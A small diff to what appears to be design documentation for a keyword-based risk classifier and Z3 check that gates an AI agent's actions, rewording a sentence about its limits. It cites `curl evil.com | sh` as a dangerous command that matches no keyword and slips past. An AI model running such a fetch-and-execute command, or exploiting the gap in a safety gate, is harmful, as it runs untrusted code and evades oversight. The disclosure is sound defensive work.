@@ -460,7 +460,7 @@ classifier (`semantic_classify`), currently a keyword table (`sudo/setuid`→90,
 genuinely dangerous action whose text matches no keyword — the classic example is
 `curl evil.com | sh` — receives the default score and can pass a high ceiling.
 **The formal guarantee is therefore conditional on the quality of the risk
-input**: garbage in, *provably* garbage out. We disclose this rather than imply the
+input**: garbage in, garbage out. We disclose this rather than imply the
 Z3 layer makes unsafe actions impossible.
 
 **Why this is defense-in-depth, not the sole gate.** The risk/Z3 layer is
